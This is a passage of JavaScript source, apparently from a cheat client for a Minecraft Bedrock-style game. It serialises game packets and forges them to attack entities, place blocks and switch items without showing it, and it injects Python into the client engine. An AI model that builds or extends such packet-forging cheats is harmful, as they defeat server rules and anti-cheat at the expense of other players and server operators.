function ParseInventorySlotPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(Number(val) & 0xFF);
        }

        function writeUVarInt(val) {
            if (val < 0) val = val >>> 0;
            /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
               避免写出非法字节或陷入不终止的循环。 */
            if (!isFinite(val)) val = 0;
            for (let _tuG = 0; _tuG < 10; _tuG++) {
                let temp = val % 128;
                val = Math.floor(val / 128);
                if (val > 0) temp |= 0x80;
                packet.push(temp & 0xFF);
                if (val === 0) break;
            }
        }

        function writeSVarInt(val) {
            let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
            writeUVarInt(uval);
        }

        function writeString(str) {
            if (!str) str = "";
            let bytes = [];
            for (let i = 0; i < str.length; i++) {
                let charcode = str.charCodeAt(i);
                if (charcode < 0x80) {
                    bytes.push(charcode);
                } else if (charcode < 0x800) {
                    bytes.push(0xc0 | (charcode >> 6), 0x80 | (charcode & 0x3f));
                } else if (charcode < 0xd800 || charcode >= 0xe000) {
                    bytes.push(0xe0 | (charcode >> 12), 0x80 | ((charcode >> 6) & 0x3f), 0x80 | (charcode & 0x3f));
                } else {
                    i++;
                    charcode = 0x10000 + (((charcode & 0x3ff) << 10) | (str.charCodeAt(i) & 0x3ff));
                    bytes.push(0xf0 | (charcode >> 18), 0x80 | ((charcode >> 12) & 0x3f), 0x80 | ((charcode >> 6) & 0x3f), 0x80 | (charcode & 0x3f));
                }
            }
            writeUVarInt(bytes.length);
            for (let i = 0; i < bytes.length; i++) {
                writeByte(bytes[i]);
            }
        }

        function writeItem(item) {
            writeSVarInt(item.id !== undefined ? item.id : 0);
            if (item.id !== undefined && item.id !== 0) {
                let buffer = new ArrayBuffer(2);
                new DataView(buffer).setUint16(0, item.count !== undefined ? item.count : 0, true);
                let view = new Uint8Array(buffer);
                packet.push(view[0]);
                packet.push(view[1]);

                writeUVarInt(item.meta !== undefined ? item.meta : 0);
                writeByte(item.hasStackId ? 1 : 0);
                if (item.hasStackId) {
                    writeSVarInt(item.stackId !== undefined ? item.stackId : 0);
                }
                writeSVarInt(item.blockRuntimeId !== undefined ? item.blockRuntimeId : 0);

                let extra = item.extra || [];
                writeUVarInt(extra.length);
                for (let i = 0; i < extra.length; i++) {
                    writeByte(extra[i]);
                }
            }
        }

        writeUVarInt(data.windowId !== undefined ? data.windowId : 0);
        writeUVarInt(data.slot !== undefined ? data.slot : 0);
        writeString(data.containerName || "");
        writeUVarInt(data.dynamicContainerSize !== undefined ? data.dynamicContainerSize : 0);
        writeUVarInt(data.dynamicContainerId !== undefined ? data.dynamicContainerId : 0);
        writeItem(data.item || {});

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readUVarInt() {
            let value = 0;
            let shift = 0;
            let byte;
            do {
                if (offset >= u8.length) break;
                byte = u8[offset++];
                value += (byte & 0x7F) * Math.pow(2, shift);
                shift += 7;
            } while (byte & 0x80);
            return value;
        }

        function readSVarInt() {
            let value = readUVarInt();
            let temp = Math.floor(value / 2);
            if (value % 2 !== 0) {
                temp = -temp - 1;
            }
            return temp;
        }

        function readString() {
            let len = readUVarInt();
            let str = "";
            let i = 0;
            while (i < len) {
                let c = readByte();
                i++;
                if (c < 0x80) {
                    str += String.fromCharCode(c);
                } else if (c > 0xbf && c < 0xe0) {
                    let c2 = readByte();
                    i++;
                    str += String.fromCharCode(((c & 0x1f) << 6) | (c2 & 0x3f));
                } else if (c > 0xdf && c < 0xf0) {
                    let c2 = readByte();
                    i++;
                    let c3 = readByte();
                    i++;
                    str += String.fromCharCode(((c & 0x0f) << 12) | ((c2 & 0x3f) << 6) | (c3 & 0x3f));
                } else {
                    let c2 = readByte();
                    i++;
                    let c3 = readByte();
                    i++;
                    let c4 = readByte();
                    i++;
                    let codePoint = (((c & 0x07) << 18) | ((c2 & 0x3f) << 12) | ((c3 & 0x3f) << 6) | (c4 & 0x3f)) - 0x10000;
                    str += String.fromCharCode((codePoint >> 10) | 0xd800, (codePoint & 0x3ff) | 0xdc00);
                }
            }
            return str;
        }

        function readItem() {
            let id = readSVarInt();
            if (id === 0) return {
                id: 0
            };

            let count = 0;
            if (offset + 2 <= u8.length) {
                count = dv.getUint16(offset, true);
                offset += 2;
            }

            let meta = readUVarInt();
            let hasStackId = readByte() === 1;
            let stackId = 0;
            if (hasStackId) {
                stackId = readSVarInt();
            }
            let blockRuntimeId = readSVarInt();

            let extraLen = readUVarInt();
            let extra = [];
            for (let i = 0; i < extraLen; i++) {
                extra.push(readByte());
            }

            return {
                id: id,
                count: count,
                meta: meta,
                hasStackId: hasStackId,
                stackId: stackId,
                blockRuntimeId: blockRuntimeId,
                extra: extra
            };
        }

        let result = {};

        result.windowId = readUVarInt();
        result.slot = readUVarInt();
        result.containerName = readString();
        result.dynamicContainerSize = readUVarInt();
        result.dynamicContainerId = readUVarInt();
        result.item = readItem();

        return result;
    }
}

function SilentPlayerInventorySlot(slot, runtimeId) {
    const InventoryItem = getInventoryItem(slot);
    let itemId = InventoryItem.itemId << 16 >> 16;
    sendNetworkPacket(31, ParseMobEquipmentPacket({
        entityRuntimeId: runtimeId,
        item: {
            id: itemId,
            count: InventoryItem.count,
            meta: 0,
            hasStackId: false,
            stackId: 0,
            blockRuntimeId: InventoryItem.blockRuntimeId || 0,
            extra: {}
        },
        inventorySlot: slot,
        hotbarSlot: slot,
        windowId: 0
    }, true));
    return true;
}

function ParseAnimatePacket(arrayBuffer) {
    const u8 = new Uint8Array(arrayBuffer);
    let offset = 0;

    function readVarInt() {
        let value = 0;
        let shift = 0;
        let b;
        do {
            if (offset >= u8.length) break;
            b = u8[offset++];
            value |= (b & 0x7F) << shift;
            shift += 7;
        } while (b & 0x80);
        return value >>> 0;
    }

    function readVarLong() {
        let value = 0n;
        let shift = 0n;
        let b;
        do {
            if (offset >= u8.length) break;
            b = u8[offset++];
            value |= BigInt(b & 0x7F) << shift;
            shift += 7n;
        } while (b & 0x80);
        return value.toString();
    }
    const actionId = readVarInt();
    const runtimeId = readVarLong();
    return {
        actionId: actionId / 2,
        runtimeId: runtimeId
    };
}

function ParseInventoryTransactionPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(Number(val) & 0xFF);
        }

        function writeUVarInt(val) {
            val = Number(val);
            if (!isFinite(val)) val = 0;
            if (val < 0) val = (val & 0xFFFFFFFF) >>> 0;
            let _tuGuard = 0;
            do {
                let temp = val % 128;
                val = Math.floor(val / 128);
                if (val > 0) temp |= 0x80;
                packet.push(temp & 0xFF);
                _tuGuard++;
            } while (val > 0 && _tuGuard < 10);
        }

        function writeSVarInt(val) {
            val = Number(val);
            let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
            writeUVarInt(uval);
        }

        function writeFloat32(val) {
            let buffer = new ArrayBuffer(4);
            let view = new DataView(buffer);
            view.setFloat32(0, Number(val), true);
            let u8 = new Uint8Array(buffer);
            for (let i = 0; i < 4; i++) {
                packet.push(u8[i]);
            }
        }

        function writeBlockPos(pos) {
            writeSVarInt(pos.x !== undefined ? pos.x : 0);
            writeUVarInt(pos.y !== undefined ? pos.y : 0);
            writeSVarInt(pos.z !== undefined ? pos.z : 0);
        }

        function writeVec3(vec) {
            writeFloat32(vec.x !== undefined ? vec.x : 0);
            writeFloat32(vec.y !== undefined ? vec.y : 0);
            writeFloat32(vec.z !== undefined ? vec.z : 0);
        }

        function writeItem(item) {
            let id = item.id !== undefined ? Number(item.id) : 0;
            if (id >= 32768 && id <= 65535) {
                id = id - 65536;
            }
            writeSVarInt(id);

            if (id !== 0) {
                let buffer = new ArrayBuffer(2);
                new DataView(buffer).setUint16(0, item.count !== undefined ? Number(item.count) : 0, true);
                let view = new Uint8Array(buffer);
                packet.push(view[0]);
                packet.push(view[1]);

                writeUVarInt(item.meta !== undefined ? item.meta : 0);
                writeByte(item.hasStackId ? 1 : 0);
                if (item.hasStackId) {
                    writeSVarInt(item.stackId !== undefined ? item.stackId : 0);
                }
                writeSVarInt(item.blockRuntimeId !== undefined ? item.blockRuntimeId : 0);

                let extra = item.extra || [];
                writeUVarInt(extra.length);
                for (let i = 0; i < extra.length; i++) {
                    writeByte(extra[i]);
                }
            }
        }

        writeSVarInt(data.legacyRequestId !== undefined ? data.legacyRequestId : 0);

        if (data.legacyRequestId !== undefined && data.legacyRequestId < -1 && (Math.abs(data.legacyRequestId) % 2) === 0) {
            let legTrans = data.legacyTransactions || [];
            writeUVarInt(legTrans.length);
            for (let i = 0; i < legTrans.length; i++) {
                writeByte(legTrans[i].containerId !== undefined ? legTrans[i].containerId : 0);
                let slots = legTrans[i].slots || [];
                writeUVarInt(slots.length);
                for (let j = 0; j < slots.length; j++) {
                    writeByte(slots[j]);
                }
            }
        }

        writeUVarInt(data.transactionType !== undefined ? data.transactionType : 0);

        let actions = data.actions || [];
        writeUVarInt(actions.length);

        for (let i = 0; i < actions.length; i++) {
            let act = actions[i];
            writeUVarInt(act.sourceType !== undefined ? act.sourceType : 0);

            if (act.sourceType === 0 || act.sourceType === 2) {
                writeSVarInt(act.windowId !== undefined ? act.windowId : 0);
            }
            if (act.sourceType === 1) {
                writeUVarInt(act.flags !== undefined ? act.flags : 0);
            }

            writeUVarInt(act.slot !== undefined ? act.slot : 0);
            writeItem(act.oldItem || {});
            writeItem(act.newItem || {});
        }

        if (data.transactionType === 2) {
            writeUVarInt(data.actionType !== undefined ? data.actionType : 0);
            writeUVarInt(data.triggerType !== undefined ? data.triggerType : 0);
            writeBlockPos(data.blockPos || {});
            writeSVarInt(data.face !== undefined ? data.face : 0);
            writeSVarInt(data.hotbarSlot !== undefined ? data.hotbarSlot : 0);
            writeItem(data.itemInHand || {});
            writeVec3(data.playerPos || {});
            writeVec3(data.clickPos || {});
            writeUVarInt(data.blockRuntimeId !== undefined ? data.blockRuntimeId : 0);
        } else if (data.transactionType === 3) {
            writeUVarInt(data.entityRuntimeId !== undefined ? data.entityRuntimeId : 0);
            writeUVarInt(data.actionType !== undefined ? data.actionType : 0);
            writeSVarInt(data.hotbarSlot !== undefined ? data.hotbarSlot : 0);
            writeItem(data.itemInHand || {});
            writeVec3(data.playerPos || {});
            writeVec3(data.clickPos || {});
        } else if (data.transactionType === 4) {
            writeUVarInt(data.actionType !== undefined ? data.actionType : 0);
            writeSVarInt(data.hotbarSlot !== undefined ? data.hotbarSlot : 0);
            writeItem(data.itemInHand || {});
            writeVec3(data.headPos || {});
        }

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readUVarInt() {
            let value = 0;
            let multiplier = 1;
            let byteData;
            do {
                if (offset >= u8.length) break;
                byteData = u8[offset++];
                value += (byteData & 0x7F) * multiplier;
                multiplier *= 128;
            } while (byteData & 0x80);
            return value;
        }

        function readSVarInt() {
            let value = readUVarInt();
            let temp = Math.floor(value / 2);
            if (value % 2 !== 0) {
                temp = -temp - 1;
            }
            return temp;
        }

        function readFloat32() {
            if (offset + 4 > u8.length) {
                offset = u8.length;
                return 0;
            }
            let val = dv.getFloat32(offset, true);
            offset += 4;
            return val;
        }

        function readBlockPos() {
            return {
                x: readSVarInt(),
                y: readUVarInt() | 0,
                z: readSVarInt()
            };
        }

        function readVec3() {
            return {
                x: readFloat32(),
                y: readFloat32(),
                z: readFloat32()
            };
        }

        function readItem() {
            let id = readSVarInt();
            if (id === 0) return {
                id: 0
            };

            if (id < 0 && id >= -32768) {
                id = id + 65536;
            }

            let count = 0;
            if (offset + 2 <= u8.length) {
                count = dv.getUint16(offset, true);
                offset += 2;
            }

            let meta = readUVarInt();
            let hasStackId = readByte() === 1;
            let stackId = 0;
            if (hasStackId) {
                stackId = readSVarInt();
            }
            let blockRuntimeId = readSVarInt();

            let extraLen = readUVarInt();
            let extra = [];
            for (let i = 0; i < extraLen; i++) {
                extra.push(readByte());
            }

            return {
                id: id,
                count: count,
                meta: meta,
                hasStackId: hasStackId,
                stackId: stackId,
                blockRuntimeId: blockRuntimeId,
                extra: extra
            };
        }

        let result = {};

        result.legacyRequestId = readSVarInt();

        if (result.legacyRequestId < -1 && (Math.abs(result.legacyRequestId) % 2) === 0) {
            let legLen = readUVarInt();
            result.legacyTransactions = [];
            for (let i = 0; i < legLen; i++) {
                let cId = readByte();
                let sLen = readUVarInt();
                let slots = [];
                for (let j = 0; j < sLen; j++) {
                    slots.push(readByte());
                }
                result.legacyTransactions.push({
                    containerId: cId,
                    slots: slots
                });
            }
        }

        result.transactionType = readUVarInt();

        let actLen = readUVarInt();
        result.actions = [];

        for (let i = 0; i < actLen; i++) {
            let act = {};
            act.sourceType = readUVarInt();

            if (act.sourceType === 0 || act.sourceType === 2) {
                act.windowId = readSVarInt();
            }
            if (act.sourceType === 1) {
                act.flags = readUVarInt();
            }

            act.slot = readUVarInt();
            act.oldItem = readItem();
            act.newItem = readItem();

            result.actions.push(act);
        }

        if (result.transactionType === 2) {
            result.actionType = readUVarInt();
            result.triggerType = readUVarInt();
            result.blockPos = readBlockPos();
            result.face = readSVarInt();
            result.hotbarSlot = readSVarInt();
            result.itemInHand = readItem();
            result.playerPos = readVec3();
            result.clickPos = readVec3();
            result.blockRuntimeId = readUVarInt();
        } else if (result.transactionType === 3) {
            result.entityRuntimeId = readUVarInt();
            result.actionType = readUVarInt();
            result.hotbarSlot = readSVarInt();
            result.itemInHand = readItem();
            result.playerPos = readVec3();
            result.clickPos = readVec3();
        } else if (result.transactionType === 4) {
            result.actionType = readUVarInt();
            result.hotbarSlot = readSVarInt();
            result.itemInHand = readItem();
            result.headPos = readVec3();
        }

        return result;
    }
}

function sendParticlePacket(EntityID) {
    const packet = new Packet();
    try {
        packet.writeUnsignedChar(8);
        writeVarInt64(packet, EntityID);
        return packet.send(44);
    } catch (e) {
        return false;
    } finally {
        packet.destroy();
    }
}

function AutoBox_RemoveShape() {
    for (let n = 0; n < AutoBox_History.length; n++) {
        if (AutoBox_History[n].id) {
            removeShape(AutoBox_History[n].id);
        }
    }
    AutoBox_History = [];
    ContainerOpenQueue = [];
}

function ModuleLog(message) {
    if (Debug_Enabled) {
        const logPath = _app.getResource() + "/TimeUnity/Module.log";
        const now = new Date();
        const time = now.toLocaleString('zh-CN', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        }).replace(/\//g, '-');
        const logLine = `[${time}] ${message}\n`;
        try {
            let oldLogs = "";
            try {
                const encryptedData = _fs.read(logPath);
                if (encryptedData) {
                    oldLogs = XorDecrypt(encryptedData, "ModuleLog");
                }
            } catch (e) {}
            const allLogs = oldLogs + logLine;
            const newEncryptedData = XorEncrypt(allLogs, "ModuleLog");
            _fs.write(logPath, newEncryptedData);
        } catch (err) {}
    }
}

function getEntityRuntimeId(id) {
    const PlayerList = getPlayerList();
    const RuntimeIdList = getPlayerList('RuntimeId');
    const index = PlayerList.indexOf(id);
    if (index !== -1 && index < RuntimeIdList.length) {
        return RuntimeIdList[index];
    }
    return null;
}

function SetSkyColor(id, R, G, B, A) {
    return _app.evalPython(`
import mod.client.extraClientApi as clientApi
comp = clientApi.GetEngineCompFactory().CreateSkyRender("${id}")
Fog = clientApi.GetEngineCompFactory().CreateFog("${id}")
comp.SetSkyColor((${R}, ${G}, ${B}, ${A}))
Fog.SetFogColor((${R}, ${G}, ${B}, ${A}))
`);
} // 设置天空颜色

const hexToUint8Array = (hex) => {
    try {
        if (hex.startsWith('0x')) {
            hex = hex.slice(2);
        }
        const bytes = [];
        for (let i = 0; i < hex.length; i += 2) {
            const byte = parseInt(hex.slice(i, i + 2), 16);
            bytes.push(byte);
        }
        return new Uint8Array(bytes);
    } catch (e) {}
}
const sendPyRpc = (id, data) => TU_SendPyRpc(id, hexToUint8Array(data));

const UseSelectItem = (slot) => {
    const InventoryItem = getInventoryItem(slot);
    sendNetworkPacket(30, ParseInventoryTransactionPacket({
        legacyRequestId: 0,
        transactionType: 2,
        actions: [],
        actionType: 1,
        triggerType: 0,
        blockPos: {
            x: 0,
            y: 0,
            z: 0
        },
        face: 255,
        hotbarSlot: slot,
        itemInHand: {
            id: InventoryItem.itemId || 0,
            count: InventoryItem.count,
            meta: 0,
            hasStackId: false,
            stackId: 0,
            blockRuntimeId: InventoryItem.blockRuntimeId || 0,
            extra: [
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0
            ]
        },
        playerPos: self_pos,
        clickPos: {
            x: 0,
            y: 0,
            z: 0
        },
        blockRuntimeId: InventoryItem.blockRuntimeId || 0
    }, true));
    return true;
} // 使用物品

const SilentBuildBlock = (x, y, z, slot = 0, face = 0) => {
    const InventoryItem = getInventoryItem(slot);
    const BlockData = getBlock(x, y, z);
    return sendNetworkPacket(30, ParseInventoryTransactionPacket({
        legacyRequestId: 0,
        transactionType: 2,
        actions: [],
        actionType: 0,
        triggerType: 1,
        blockPos: {
            x: x,
            y: y,
            z: z
        },
        face: face,
        hotbarSlot: slot,
        itemInHand: {
            id: InventoryItem.itemId || 0,
            count: InventoryItem.count || 1,
            meta: 0,
            hasStackId: false,
            stackId: 0,
            blockRuntimeId: InventoryItem.blockRuntimeId || 0,
            extra: [
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0
            ]
        },
        playerPos: self_pos,
        clickPos: {
            x: 0,
            y: 0,
            z: 0
        },
        blockRuntimeId: BlockData.runtimeId || 0
    }, true));
} // 放置/点击方块

const SilentAttackEntity = (id, slot, pos) => {
    const InventoryItem = getInventoryItem(slot);
    const EntityRuntimeId = getEntityRuntimeId(id);
    return sendNetworkPacket(30, ParseInventoryTransactionPacket({
        legacyRequestId: 0,
        transactionType: 3,
        actions: [],
        entityRuntimeId: EntityRuntimeId,
        actionType: 1,
        hotbarSlot: slot,
        itemInHand: {
            id: InventoryItem.itemId || 0,
            count: InventoryItem.count || 1,
            meta: 0,
            hasStackId: false,
            stackId: 0,
            blockRuntimeId: InventoryItem.blockRuntimeId || 0,
            extra: [
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0,
                0
            ]
        },
        playerPos: pos,
        clickPos: {
            x: 0,
            y: 0,
            z: 0
        }
    }, true));
} // 攻击实体

function closeContainer(windowId = 0) {
    try {
        const packet = new Packet();
        packet.writeByte(windowId);
        packet.writeBool(false);
        const result = packet.send(47);
        packet.destroy();
        return result;
    } catch (e) {
        return false;
    }
}

function ParseMobEquipmentPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(Number(val) & 0xFF);
        }

        function writeUVarInt(val) {
            if (val < 0) val = val >>> 0;
            /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
               避免写出非法字节或陷入不终止的循环。 */
            if (!isFinite(val)) val = 0;
            for (let _tuG = 0; _tuG < 10; _tuG++) {
                let temp = val % 128;
                val = Math.floor(val / 128);
                if (val > 0) temp |= 0x80;
                packet.push(temp & 0xFF);
                if (val === 0) break;
            }
        }

        function writeSVarInt(val) {
            let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
            writeUVarInt(uval);
        }

        function writeUVarInt64(val) {
            try {
                let v = BigInt(val);
                if (v < BigInt(0)) {
                    v = BigInt("18446744073709551616") + v;
                }
                do {
                    let temp = Number(v & BigInt(0x7F));
                    v = v >> BigInt(7);
                    if (v > BigInt(0)) temp |= 0x80;
                    packet.push(temp);
                } while (v > BigInt(0));
            } catch (e) {
                let v = Number(val);
                if (v < 0) v = v >>> 0;
                /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
                   避免写出非法字节或陷入不终止的循环。 */
                if (!isFinite(v)) v = 0;
                for (let _tuG = 0; _tuG < 10; _tuG++) {
                    let temp = v % 128;
                    v = Math.floor(v / 128);
                    if (v > 0) temp |= 0x80;
                    packet.push(temp & 0xFF);
                    if (v === 0) break;
                }
            }
        }

        function writeItem(item) {
            writeSVarInt(item.id !== undefined ? item.id : 0);
            if (item.id !== undefined && item.id !== 0) {
                let buffer = new ArrayBuffer(2);
                new DataView(buffer).setUint16(0, item.count !== undefined ? item.count : 0, true);
                let view = new Uint8Array(buffer);
                packet.push(view[0]);
                packet.push(view[1]);

                writeUVarInt(item.meta !== undefined ? item.meta : 0);
                writeByte(item.hasStackId ? 1 : 0);
                if (item.hasStackId) {
                    writeSVarInt(item.stackId !== undefined ? item.stackId : 0);
                }
                writeSVarInt(item.blockRuntimeId !== undefined ? item.blockRuntimeId : 0);

                let extraBytes = null;
                if (item.extra != null) {
                    if (Array.isArray(item.extra) || item.extra instanceof Uint8Array) {
                        extraBytes = new Uint8Array(item.extra);
                    } else {
                        extraBytes = new Uint8Array(ParseDataPacketNBT(item.extra, true));
                    }
                }
                writeUVarInt(extraBytes ? extraBytes.length : 0);
                if (extraBytes) {
                    for (let i = 0; i < extraBytes.length; i++) {
                        packet.push(extraBytes[i]);
                    }
                }
            }
        }

        writeUVarInt64(data.entityRuntimeId !== undefined ? data.entityRuntimeId : 0);
        writeItem(data.item || {});
        writeByte(data.inventorySlot !== undefined ? data.inventorySlot : 0);
        writeByte(data.hotbarSlot !== undefined ? data.hotbarSlot : 0);
        writeByte(data.windowId !== undefined ? data.windowId : 0);

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readUVarInt() {
            let value = 0;
            let shift = 0;
            let byte;
            do {
                if (offset >= u8.length) break;
                byte = u8[offset++];
                value += (byte & 0x7F) * Math.pow(2, shift);
                shift += 7;
            } while (byte & 0x80);
            return value;
        }

        function readSVarInt() {
            let value = readUVarInt();
            let temp = Math.floor(value / 2);
            if (value % 2 !== 0) {
                temp = -temp - 1;
            }
            return temp;
        }

        function readUVarInt64() {
            try {
                let value = BigInt(0);
                let shift = BigInt(0);
                let byte;
                do {
                    if (offset >= u8.length) break;
                    byte = BigInt(u8[offset++]);
                    value += (byte & BigInt(0x7F)) << shift;
                    shift += BigInt(7);
                } while (byte & BigInt(0x80));
                return value.toString();
            } catch (e) {
                let value = 0;
                let shift = 0;
                let byte;
                do {
                    if (offset >= u8.length) break;
                    byte = u8[offset++];
                    value += (byte & 0x7F) * Math.pow(2, shift);
                    shift += 7;
                } while (byte & 0x80);
                return value;
            }
        }

        function readItem() {
            let id = readSVarInt();
            if (id === 0) return {
                id: 0
            };

            let count = 0;
            if (offset + 2 <= u8.length) {
                count = dv.getUint16(offset, true);
                offset += 2;
            }

            let meta = readUVarInt();
            let hasStackId = readByte() === 1;
            let stackId = 0;
            if (hasStackId) {
                stackId = readSVarInt();
            }
            let blockRuntimeId = readSVarInt();

            let extraLen = readUVarInt();
            let extra = null;
            if (extraLen > 0) {
                if (offset + extraLen <= u8.length) {
                    let extraSlice = u8.slice(offset, offset + extraLen);
                    extra = ParseDataPacketNBT(extraSlice.buffer, false);
                    offset += extraLen;
                } else {
                    offset = u8.length;
                }
            }

            return {
                id,
                count,
                meta,
                hasStackId,
                stackId,
                blockRuntimeId,
                extra
            };
        }

        let result = {};

        result.entityRuntimeId = readUVarInt64();
        result.item = readItem();
        result.inventorySlot = readByte();
        result.hotbarSlot = readByte();
        result.windowId = readByte();

        return result;
    }
}

function SyncSkin_writeVarInt(packet, val) {
    let value = BigInt(val);
    do {
        let byte = Number(value & 0x7Fn);
        value >>= 7n;
        if (value !== 0n) byte |= 0x80;
        packet.writeUnsignedChar(byte);
    } while (value !== 0n);
}

function SyncSkin_writeUInt64LE(packet, val) {
    const v = BigInt(val);
    packet.writeUnsignedInt64(v);
}

function SyncSkin_writeString(packet, str) {
    if (!str) {
        SyncSkin_writeVarInt(packet, 0);
        return;
    }
    const len = str.length;
    SyncSkin_writeVarInt(packet, len);
    const buf = new ArrayBuffer(len);
    const view = new Uint8Array(buf);
    for (let i = 0; i < len; i++) {
        view[i] = str.charCodeAt(i);
    }
    packet.writeBytes(buf);
}

function ParseSyncSkinPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(val & 0xFF);
        }

        function writeUVarInt(val) {
            let v = typeof val === 'bigint' ? val : BigInt(val);
            if (v < 0n) v = BigInt.asUintN(64, v);
            do {
                let temp = Number(v & 0x7Fn);
                v = v >> 7n;
                if (v > 0n) temp |= 0x80;
                packet.push(temp);
            } while (v > 0n);
        }

        function writeUInt64LE(val) {
            let v = typeof val === 'bigint' ? val : BigInt(val);
            let low = v & 0xFFFFFFFFn;
            let high = (v >> 32n) & 0xFFFFFFFFn;
            let buf = new ArrayBuffer(8);
            let dv = new DataView(buf);
            dv.setUint32(0, Number(low), true);
            dv.setUint32(4, Number(high), true);
            let u8 = new Uint8Array(buf);
            for (let i = 0; i < 8; i++) packet.push(u8[i]);
        }

        function writeString(str) {
            if (!str) {
                writeUVarInt(0);
                return;
            }
            let bytes = [];
            for (let i = 0; i < str.length; i++) {
                let c = str.charCodeAt(i);
                if (c < 0x80) {
                    bytes.push(c);
                } else if (c < 0x800) {
                    bytes.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f));
                } else if (c < 0xd800 || c >= 0xe000) {
                    bytes.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f));
                } else {
                    i++;
                    c = 0x10000 + (((c & 0x3ff) << 10) | (str.charCodeAt(i) & 0x3ff));
                    bytes.push(0xf0 | (c >> 18), 0x80 | ((c >> 12) & 0x3f), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f));
                }
            }
            writeUVarInt(bytes.length);
            for (let i = 0; i < bytes.length; i++) {
                writeByte(bytes[i]);
            }
        }

        let skins = data.skins || [];
        writeUVarInt(skins.length);
        for (let i = 0; i < skins.length; i++) {
            let skin = skins[i];
            writeByte(skin.skinType || 1);
            writeUInt64LE(skin.uuid_msb || 0n);
            writeUInt64LE(skin.uuid_lsb || 0n);
            writeString(skin.skinId || "");
            writeString(skin.resourcePatch || "");
            writeString(skin.imageData || "");
            writeString(skin.itemId || "");
            writeString(skin.geometryData || "");
            writeString(skin.animationData || "");
            writeString(skin.capeData || "");
            writeString(skin.materialData || "");
            writeString(skin.verified || "");
            writeString(skin.personaPiece || "");
            writeString(skin.pieceTint || "");
            writeString(skin.mappingData || "");
            writeString(skin.capeId || "");
            writeString(skin.udid || "");
        }
        writeString(data.platformUserId || "");
        writeUVarInt(data.unknownInt || 4);
        writeString(data.armSize || "wide");
        writeString(data.version || "");

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readUVarInt() {
            let value = 0n;
            let shift = 0n;
            let byteData;
            do {
                if (offset >= u8.length) break;
                byteData = u8[offset++];
                value |= BigInt(byteData & 0x7F) << shift;
                shift += 7n;
            } while (byteData & 0x80);
            return value;
        }

        function readUInt64LE() {
            if (offset + 8 > u8.length) return "0";
            let low = dv.getUint32(offset, true);
            let high = dv.getUint32(offset + 4, true);
            offset += 8;
            return ((BigInt(high) << 32n) | BigInt(low)).toString();
        }

        function readString() {
            let len = Number(readUVarInt());
            if (len <= 0 || offset >= u8.length) return "";
            let end = offset + len;
            if (end > u8.length) end = u8.length;
            let str = "";
            while (offset < end) {
                let c = u8[offset++];
                if (c < 128) {
                    str += String.fromCharCode(c);
                } else if (c > 191 && c < 224) {
                    let c2 = u8[offset++];
                    str += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                } else if (c > 239 && c < 365) {
                    let c2 = u8[offset++];
                    let c3 = u8[offset++];
                    let c4 = u8[offset++];
                    let u = (((c & 7) << 18) | ((c2 & 63) << 12) | ((c3 & 63) << 6) | (c4 & 63)) - 0x10000;
                    str += String.fromCharCode(0xD800 + (u >> 10));
                    str += String.fromCharCode(0xDC00 + (u & 1023));
                } else {
                    let c2 = u8[offset++];
                    let c3 = u8[offset++];
                    str += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                }
            }
            return str;
        }

        let result = {};
        result.skins = [];
        let skinsCount = Number(readUVarInt());

        for (let i = 0; i < skinsCount; i++) {
            let skin = {};
            skin.skinType = readByte();
            skin.uuid_msb = readUInt64LE();
            skin.uuid_lsb = readUInt64LE();
            skin.skinId = readString();
            skin.resourcePatch = readString();
            skin.imageData = readString();
            skin.itemId = readString();
            skin.geometryData = readString();
            skin.animationData = readString();
            skin.capeData = readString();
            skin.materialData = readString();
            skin.verified = readString();
